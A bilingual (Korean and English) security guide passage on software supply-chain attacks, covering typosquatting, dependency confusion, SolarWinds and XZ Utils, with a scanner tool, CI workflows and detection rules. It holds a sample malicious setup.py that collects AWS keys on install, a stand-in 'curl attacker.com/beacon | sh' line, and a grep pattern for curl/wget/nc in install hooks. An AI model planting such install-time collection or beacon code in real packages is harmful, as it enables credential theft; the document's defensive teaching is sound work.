    batch_p.add_argument("--file", required=True, help="requirements.txt 또는 package.json 경로")
    batch_p.add_argument("--registry", required=True, choices=["pypi", "npm"],
                         help="패키지 저장소")
    batch_p.add_argument("--workers", type=int, default=10, help="병렬 워커 수")
    batch_p.add_argument("--output", help="JSON 결과 파일 경로")

    return parser


def cmd_pypi(args: argparse.Namespace) -> int:
    formatter = OutputFormatter()
    with SupplyChainScanner(workers=args.workers) as scanner:
        result = scanner.scan_pypi(args.package)
        formatter.print_result(result)
        if args.output:
            Path(args.output).write_text(
                formatter.to_json([result]), encoding="utf-8"
            )
            print(f"\n결과 저장: {args.output}")
    suspicious = sum(1 for p in result.typosquats_found if p.is_suspicious)
    return 1 if suspicious > 0 else 0


def cmd_npm(args: argparse.Namespace) -> int:
    formatter = OutputFormatter()
    with SupplyChainScanner(workers=args.workers) as scanner:
        result = scanner.scan_npm(args.package)
        formatter.print_result(result)
        if args.output:
            Path(args.output).write_text(
                formatter.to_json([result]), encoding="utf-8"
            )
            print(f"\n결과 저장: {args.output}")
    suspicious = sum(1 for p in result.typosquats_found if p.is_suspicious)
    return 1 if suspicious > 0 else 0


def cmd_batch(args: argparse.Namespace) -> int:
    path = Path(args.file)
    if not path.exists():
        print(f"파일 없음: {path}", file=sys.stderr)
        return 2

    formatter = OutputFormatter()
    with SupplyChainScanner(workers=args.workers) as scanner:
        results = scanner.scan_requirements_file(path, args.registry, args.workers)

    total_suspicious = 0
    for result in results:
        formatter.print_result(result)
        total_suspicious += sum(1 for p in result.typosquats_found if p.is_suspicious)

    print(f"\n{'='*60}")
    print(f"총 스캔: {len(results)}개 패키지")
    print(f"총 의심 패키지 발견: {total_suspicious}개")

    if args.output:
        Path(args.output).write_text(
            formatter.to_json(results), encoding="utf-8"
        )
        print(f"결과 저장: {args.output}")

    return 1 if total_suspicious > 0 else 0


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    dispatch = {
        "pypi": cmd_pypi,
        "npm": cmd_npm,
        "batch": cmd_batch,
    }

    handler = dispatch.get(args.command)
    if handler is None:
        parser.print_help()
        return 2

    try:
        return handler(args)
    except KeyboardInterrupt:
        print("\n중단됨", file=sys.stderr)
        return 130
    except Exception as e:
        print(f"오류: {e}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
```

### 5-1. 도구 사용 예시

```bash
# PyPI requests 패키지 타이포스쿼팅 스캔
python supply_chain_scanner.py pypi --package requests --workers 20

# npm lodash 스캔 후 JSON 보고서
python supply_chain_scanner.py npm --package lodash --output lodash_scan.json

# CI/CD에서 requirements.txt 자동 검사 (종료 코드 1 = 위험 발견)
python supply_chain_scanner.py batch \
  --file requirements.txt \
  --registry pypi \
  --workers 15 \
  --output scan_report.json

# 종료 코드 확인
echo $?  # 0 = 안전, 1 = 의심 패키지 발견, 2 = 오류
```

### 5-2. GitHub Actions 통합

```yaml
# .github/workflows/supply-chain-check.yml
name: Supply Chain Security Check
on:
  push:
    paths:
      - 'requirements*.txt'
      - 'package.json'
      - 'package-lock.json'

jobs:
  typosquatting-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install httpx
      - name: Run typosquatting scan
        run: |
          python supply_chain_scanner.py batch \
            --file requirements.txt \
            --registry pypi \
            --output scan_report.json
      - name: Upload report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: supply-chain-report
          path: scan_report.json
```

---

## 6. 의존성 혼동 공격 탐지

```bash
# pip 설정 감사 — index-url 설정 확인
cat ~/.pip/pip.conf
cat /etc/pip.conf
pip config list

# 위험한 설정 패턴
# [global]
# extra-index-url = https://pypi.org/simple/  ← 의존성 혼동 취약
# index-url = https://internal.corp/simple/

# 안전한 설정
# [global]
# index-url = https://internal.corp/simple/
# (extra-index-url 없음)

# 또는 패키지별 해시 고정
pip install --require-hashes -r requirements.txt

# requirements.txt에 해시 추가
pip-compile --generate-hashes requirements.in

# npm 설정 감사
cat ~/.npmrc
npm config get registry

# 안전한 npm 설정
# registry=https://internal.corp/npm/
# @mycompany:registry=https://internal.corp/npm/
```

---

## 7. 패키지 검증 체크리스트

```
배포 전:
  □ 패키지 이름이 PyPI/npm에 이미 존재하는지 확인
  □ SLSA provenance 생성 (L2 이상)
  □ Sigstore로 릴리즈 서명
  □ SBOM 생성 및 배포
  □ 패키지 해시를 릴리즈 노트에 공개

설치 전:
  □ 패키지 이름 오타 재확인
  □ 저장소 URL 직접 확인 (pypi.org/project/<name>)
  □ 최근 업데이트 시간 및 다운로드 수 확인
  □ 설치 후 네트워크 연결 모니터링 (outbound DNS/HTTP)
  □ setup.py / postinstall 스크립트 코드 검토

지속 모니터링:
  □ pip-audit / npm audit 주기적 실행
  □ GitHub Dependabot 활성화
  □ OpenSSF Scorecard로 의존성 보안 점수 추적
```

---

<!-- detect-validate-35 -->
## 공급망 침해 탐지와 패키지 무결성 검증

소프트웨어 공급망 공격은 *패키지 저장소 오염·빌드 시스템 침해(SolarWinds)·악성 의존성(XZ)·의존성 혼동*으로 신뢰된 배포 경로에 코드를 심는다. 방어자는 **설치되는 아티팩트가 출처 검증되고 변조가 탐지되는가**를 검증해야 한다. 검증은 **소유 빌드/레지스트리**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| 저장소 오염 | 미서명 패키지 | 서명·해시 핀 | 해시 불일치 |
| 빌드 침해 | 변조된 빌드산출물 | 재현가능 빌드·프로비넌스 | 빌드 산출물 diff |
| 악성 의존성 | 신뢰된 메인테이너 | 동작·소스 감사 | 신규 네트워크/빌드 후크 |
| 의존성 혼동 | 내부명 공개 노출 | 스코프·내부 미러 | 외부서 내부명 설치 |

### 방어 검증 (직접 확인)

```bash
# 1) 락파일의 무결성 해시가 고정됐는지 — 핀 없으면 변조 패키지 수용 위험
jq -r '.packages | to_entries[] | select(.value.integrity==null) | .key' package-lock.json 2>/dev/null | head
# 2) 설치 의존성이 의도외 네트워크/빌드 후크를 갖는지(소유 트리) — postinstall/exfil 신호
grep -rnE '"(post|pre)install"|curl |wget |nc ' node_modules/*/package.json 2>/dev/null | head
```

> 공급망 방어는 *아티팩트 출처가 검증되는가*다 — "빌드된다"와 "모든 의존성 해시가 핀되고 프로비넌스가 검증되며 의도외 빌드 후크가 없다"는 다르다. 소유 빌드/레지스트리에서 무결성을 직접 확인한다([[18_DevSecOps]], [[59_Supply_Chain_Security]], [[74_Code_Auditing]]).

**최신 기법·통제 (2025–2026):**
- SLSA·프로버넌스·서명(Sigstore)이 무결성 표준 — 검증: 미검증 아티팩트가 배포 전 차단되는가([[59_Supply_Chain_Security]])
- SBOM·의존성 가시성 — 강제되는지 확인([[18_DevSecOps]])

---

<a name="english"></a>

# 01 — Software Supply Chain Attacks

## 1. Package Repository Attacks

### 1-1. Typosquatting

Attackers register package names similar to legitimate packages, anticipating developer typos. A single misspelling during `pip install` or `npm install` can execute malicious code.

```bash
# Real-world typosquatting examples (npm)
# Legitimate: lodash         → Malicious: lodahs, odash, l0dash
# Legitimate: express        → Malicious: expres, expresss
# Legitimate: react          → Malicious: reac, reeact, raect

# PyPI typosquatting examples
# Legitimate: requests       → Malicious: requets, request, reqeusts
# Legitimate: boto3          → Malicious: bot03, b0to3
# Legitimate: urllib3        → Malicious: urlib3, urllib2, urrllib3
# Legitimate: setuptools     → Malicious: setuptool, setup-tools

# Code patterns executed by malicious packages on install (inside setup.py)
# os.system("curl attacker.com/beacon | sh")
# subprocess.run(["python3", "-c", "import socket; ..."])
```

Typical `setup.py` payload structure in a typosquatting package:

```python
# Malicious setup.py pattern (for analysis purposes)
from setuptools import setup
import os
import socket
import platform

def exfil():
    """Data exfiltration code that runs automatically on install"""
    try:
        data = {
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "user": os.environ.get("USER", "unknown"),
            "home": os.path.expanduser("~"),
            # Attempt to steal AWS credentials
            "aws_key": os.environ.get("AWS_ACCESS_KEY_ID", ""),
            "aws_secret": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        }
        # Send to attacker's server via HTTP POST
        # requests.post("http://c2.attacker.com/collect", json=data)
    except Exception:
        pass

exfil()

setup(
    name="requets",  # typosquatting
    version="2.28.1",  # disguised as the same version as the legitimate package
    # ...
)
```

### 1-2. Dependency Confusion

An attack technique disclosed by Alex Birsan in 2021. When an internal package name is registered in a public repository with a higher version number, pip/npm prioritizes the public repository over the internal one.

```bash
# Attack scenario
# 1. Collect internal package names (from package.json, requirements.txt)
# 2. Register the same name with a higher version on public PyPI/npm
# 3. When a developer runs pip install, the malicious public package is installed instead

# Vulnerable pip configuration example
# When only extra-index-url is set in pip.conf
[global]
index-url = https://internal.company.com/simple/
extra-index-url = https://pypi.org/simple/
# Problem: extra-index-url is queried in parallel, not as fallback → selects the higher version

# Defense: use only --index-url or pin per package
pip install mypackage==1.0.0 --index-url https://internal.company.com/simple/

# npm dependency confusion defense
# Configure scope in .npmrc
@mycompany:registry=https://internal.company.com/npm/
```

### 1-3. Malicious Account Takeover

```bash
# Real-world case: event-stream (npm, 2018)
# - Popular package maintainer transferred rights to a new contributor
# - New contributor added flatmap-stream dependency → contained Bitcoin wallet theft code

# Session token theft attacks continue even after PyPI enforced 2FA
# Attack flow:
# 1. Phish maintainer → steal .pypirc or API token
# 2. Sniff pip authentication token environment variables
# 3. Expose TWINE_PASSWORD in CI/CD environments

# Detection: abnormal release timing (late weekend nights, during maintainer inactivity)
# Detection: drastic code changes (large diffs for small version bumps)
```

---

## 2. SolarWinds Attack Vector — Detailed Analysis

### 2-1. Attack Timeline

```
2019-10 : Initial compromise of SolarWinds build server (exact vector unknown)
2020-02 : SUNSPOT malware installed on build server
2020-03 : SUNBURST injection begins into Orion builds 2019.4~2020.2.1
2020-03 ~ 2020-12 : 18,000 organizations infected via distributed updates
2020-12-13 : FireEye discovers and discloses SUNBURST
2020-12-14 : US government officially confirms
2021-01 : SUNSPOT analysis complete — source injection via MsBuild.exe process hooking
```

### 2-2. SUNSPOT — Build Server Implant

SUNSPOT monitored MsBuild.exe execution and, upon detecting an Orion build, replaced the source files with malicious versions.

```csharp
// Source file replacement pattern performed by SUNSPOT (reconstructed)
// Original: SolarWinds.Orion.Core.BusinessLayer.dll being built
// SUNSPOT replaced InventoryManager.cs with a malicious version

// Class with SUNBURST injected (simplified)
namespace SolarWinds.Orion.Core.BusinessLayer {
    internal class OrionImprovementBusinessLayer {
        // Domain Generation Algorithm (DGA) — C2 communication
        private static string GetOrionImprovementCustomerId() {
            // Encodes victim identifier via DGA into DNS queries
            // C2 communication via subdomain of avsvmcloud.com
            // e.g.: 58k52dbg53.appsync-api.eu-west-1.avsvmcloud.com
        }
    }
}
```

### 2-3. SUNBURST C2 Communication Mechanism

```python
# SUNBURST C2 communication pattern analysis (for defense)
# DNS-based C2 — disguised as normal Orion traffic

# Domain generation pattern used by SUNBURST
import hashlib
import base64

def analyze_sunburst_dga(victim_id: str) -> str:
    """
    SUNBURST DGA pattern reconstruction (for detection signature development)
    Actual implementation uses victim UID + timestamp-based encoding
    """
    # Encode victim identifier as Base32 to create subdomain
    encoded = base64.b32encode(victim_id.encode()).decode().lower()
    return f"{encoded}.appsync-api.eu-west-1.avsvmcloud.com"

# SUNBURST detection signature (YARA)
SUNBURST_YARA = """
rule SUNBURST_BACKDOOR {
    meta:
        description = "SolarWinds SUNBURST backdoor detection"
    strings:
        $s1 = "avsvmcloud.com" ascii
        $s2 = "OrionImprovementBusinessLayer" ascii
        $s3 = "SolarWinds.Orion.Core.BusinessLayer" ascii
        $dga = /[a-z0-9]{15,32}\\.appsync-api\\.[a-z0-9-]+\\.avsvmcloud\\.com/
    condition:
        2 of them
}
"""

# Network detection: monitor avsvmcloud.com DNS queries
# Zeek/Suricata signature
SURICATA_RULE = """
alert dns any any -> any 53 (
    msg:"SUNBURST C2 DNS lookup";
    dns.query;
    content:"avsvmcloud.com";
    nocase;
    sid:9000001;
    rev:1;
)
"""
```

### 2-4. Detection Evasion Techniques

```
1. Long dormancy period (C2 activation after 14+ days of inactivity)
2. Signed with legitimate SolarWinds code signing certificate
3. Uses Orion-related process/service names
4. Analysis environment detection (domain queries, process list checks)
5. C2 infrastructure concealment via DGA
6. Firewall bypass using DNS C2
```

---

## 3. XZ Utils CVE-2024-3094 — Detailed Analysis

### 3-1. Attack Timeline

```
2021-10 : "Jia Tan" (JiaT75) account created, first XZ contribution
2022-01 : Builds trust through continuous small contributions
2022-05 : Requests co-maintainer rights from existing maintainer "Lasse Collin"
2023-03 : Acts as de facto maintainer from 5.4.0 release onward
2023-06 ~ 2024-02 : Prepares backdoor insertion code in stages
2024-02-23 : Releases 5.6.0 containing malicious build scripts
2024-03-09 : Releases 5.6.1 (improved backdoor obfuscation)
2024-03-29 : Andres Freund (Microsoft) discovers it while investigating SSH login delays
2024-03-29 : CVE-2024-3094 disclosed, patch immediately distributed
```

### 3-2. Backdoor Insertion Mechanism

```bash
# XZ Utils backdoor was inserted into build scripts, not source code
# configure.ac and Makefile.am extract malicious objects from test files

# Malicious file locations
# tests/files/bad-3-corrupt_lzma2.xz  — contains malicious object file
# tests/files/good-large_compressed.lzz — additional payload

# Malicious code extraction during build (configure.ac)
# if test "x$enable_sandbox" != xno && test -f /proc/version; then
#   # Extract object from test file and link it
# fi

# Backdoor effects
# - Malicious code injected into liblzma.so
# - systemd links sshd via liblzma
# - Attacker-controlled code runs during RSA key authentication
# - Attacker with a specific RSA public key can SSH in without authentication

# Affected distributions
# Fedora 40/41 (testing), Debian unstable/testing
# openSUSE Tumbleweed, Kali Linux, Arch Linux (during certain periods)
```

### 3-3. Social Engineering Trust-Building Strategy

```
Long-term infiltration strategy used by "Jia Tan":

1. Consistently submitted high-quality small patches (over 2 years)
2. Actively helped in issue trackers
3. Built credibility by contributing to other projects (libarchive, etc.)
4. Exploited existing maintainer burnout (Lasse Collin's personal circumstances)
5. Fake user accounts ("Jigar Kumar", "Dennis Ens") pressured for maintainer change
6. Gradual privilege escalation: contributor → co-maintainer → primary maintainer
```

### 3-4. Detection Methods (Post-Mortem Analysis)

```bash
# SSH login delay symptom (first noticed by Andres Freund)
# Sudden sshd CPU spike accompanied by valgrind errors

# Check for impact
strings /usr/lib/x86_64-linux-gnu/liblzma.so.5 | grep -i "ssh"
# Clean: no ssh-related strings
# Infected: N/A (code is obfuscated)

# Check version
xz --version
# 5.6.0 or 5.6.1 is dangerous

# Real-time detection (if currently installed)
dpkg -l | grep liblzma
rpm -qa | grep xz-libs

# Patch method
sudo apt install --reinstall xz-utils  # Debian/Ubuntu
sudo dnf downgrade xz                  # Fedora
```

---

## 4. Malicious Package Detection Methods

### 4-1. SLSA (Supply-chain Levels for Software Artifacts)

```
SLSA Levels:
L0: No guarantees
L1: Build process documented, provenance generated
L2: Build service used, signed provenance
L3: Hardened build service (isolation, audit logs)
L4: Two-party review, hermetic build environment (future goal)

Practical application:
- Auto-generate SLSA provenance in GitHub Actions
- Use slsa-github-generator
```

```yaml
# .github/workflows/slsa.yml — SLSA L3 provenance generation
name: SLSA Provenance
on:
  release:
    types: [created]

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      digests: ${{ steps.hash.outputs.digests }}
    steps:
      - uses: actions/checkout@v4
      - name: Build artifacts
        run: make build
      - name: Generate hash
        id: hash
        run: |
          sha256sum dist/* | base64 -w0 > digests
          echo "digests=$(cat digests)" >> $GITHUB_OUTPUT

  provenance:
    needs: [build]
    permissions:
      actions: read
      id-token: write
      contents: write
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.10.0
    with:
      base64-subjects: ${{ needs.build.outputs.digests }}
```

### 4-2. Sigstore — Code Signing

```bash
# Sign a container image with cosign
cosign sign --key cosign.key gcr.io/myproject/myimage:latest

# Verify signature
cosign verify --key cosign.pub gcr.io/myproject/myimage:latest

# Keyless signing (OIDC-based)
COSIGN_EXPERIMENTAL=1 cosign sign gcr.io/myproject/myimage:latest

# Python package signing (sigstore-python)
pip install sigstore
python -m sigstore sign dist/mypackage-1.0.0.tar.gz
python -m sigstore verify identity \
  --bundle dist/mypackage-1.0.0.tar.gz.sigstore \
  --certificate-identity user@example.com \
  --certificate-oidc-issuer https://accounts.google.com \
  dist/mypackage-1.0.0.tar.gz
```

### 4-3. in-toto — Full Supply Chain Integrity

```python
# in-toto link metadata generation example
from in_toto import runlib

# Generate link file at each build step
runlib.in_toto_run(
    name="build",
    link_signing_keyid="developer_key",
    material_list=["src/"],
    product_list=["dist/"],
    run=["make", "build"],
    signing_keyids=["developer_key"],
    gpg_keyid=None,
)

# Verification (in deployment environment)
from in_toto import verifylib
verifylib.in_toto_verify("root.layout", ["vendor_key"])
```

---

## 5. Python Tool — PyPI/npm Typosquatting Scanner

(See Korean section above for the full tool code — code blocks are identical)

### 5-1. Tool Usage Examples

```bash
# Scan PyPI for typosquats of the requests package
python supply_chain_scanner.py pypi --package requests --workers 20

# Scan npm lodash and save JSON report
python supply_chain_scanner.py npm --package lodash --output lodash_scan.json

# Automatic requirements.txt check in CI/CD (exit code 1 = risk found)
python supply_chain_scanner.py batch \
  --file requirements.txt \
  --registry pypi \
  --workers 15 \
  --output scan_report.json

# Check exit code
echo $?  # 0 = safe, 1 = suspicious package found, 2 = error
```

### 5-2. GitHub Actions Integration

```yaml
# .github/workflows/supply-chain-check.yml
name: Supply Chain Security Check
on:
  push:
    paths:
      - 'requirements*.txt'
      - 'package.json'
      - 'package-lock.json'

jobs:
  typosquatting-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install httpx
      - name: Run typosquatting scan
        run: |
          python supply_chain_scanner.py batch \
            --file requirements.txt \
            --registry pypi \
            --output scan_report.json
      - name: Upload report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: supply-chain-report
          path: scan_report.json
```

---

## 6. Dependency Confusion Attack Detection

```bash
# Audit pip configuration — check index-url settings
cat ~/.pip/pip.conf
cat /etc/pip.conf
pip config list

# Dangerous configuration pattern
# [global]
# extra-index-url = https://pypi.org/simple/  ← vulnerable to dependency confusion
# index-url = https://internal.corp/simple/

# Safe configuration
# [global]
# index-url = https://internal.corp/simple/
# (no extra-index-url)

# Or pin packages with hashes
pip install --require-hashes -r requirements.txt

# Add hashes to requirements.txt
pip-compile --generate-hashes requirements.in

# npm configuration audit
cat ~/.npmrc
npm config get registry

# Safe npm configuration
# registry=https://internal.corp/npm/
# @mycompany:registry=https://internal.corp/npm/
```

---

## 7. Package Verification Checklist

```
Before publishing:
  □ Verify package name does not already exist on PyPI/npm
  □ Generate SLSA provenance (L2 or higher)
  □ Sign releases with Sigstore
  □ Generate and publish SBOM
  □ Publish package hashes in release notes

Before installing:
  □ Double-check package name for typos
  □ Verify repository URL directly (pypi.org/project/<name>)
  □ Check recent update time and download count
  □ Monitor network connections after install (outbound DNS/HTTP)
  □ Review setup.py / postinstall script code

Continuous monitoring:
  □ Periodically run pip-audit / npm audit
  □ Enable GitHub Dependabot
  □ Track dependency security scores with OpenSSF Scorecard
```

<!-- detect-validate-35 -->
## Supply-Chain Compromise Detection and Package-Integrity Validation

Software supply-chain attacks implant code into trusted distribution paths via *repository poisoning, build-system compromise (SolarWinds), malicious dependencies (XZ), and dependency confusion*. Defenders must verify **whether installed artifacts are provenance-checked and tampering is detected**. Validate only on **owned builds/registries**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| Repo poisoning | Unsigned packages | Sign, pin hashes | Hash mismatch |
| Build compromise | Tampered build output | Reproducible build, provenance | Build-output diff |
| Malicious dependency | Trusted maintainer | Behavior/source audit | New network/build hook |
| Dependency confusion | Internal names exposed | Scope, internal mirror | Internal name from public |

### Defense validation (verify directly)

```bash
# 1) Whether lockfile integrity hashes are pinned — without pins, tampered packages are accepted
jq -r '.packages | to_entries[] | select(.value.integrity==null) | .key' package-lock.json 2>/dev/null | head
# 2) Whether installed deps have unintended network/build hooks (owned tree) — postinstall/exfil signal
grep -rnE '"(post|pre)install"|curl |wget |nc ' node_modules/*/package.json 2>/dev/null | head
```

> Supply-chain defense is *whether artifact provenance is verified* -- "it builds" differs from "every dependency hash is pinned, provenance is verified, and there are no unintended build hooks". Confirm integrity on owned builds/registries directly ([[18_DevSecOps]], [[59_Supply_Chain_Security]], [[74_Code_Auditing]]).
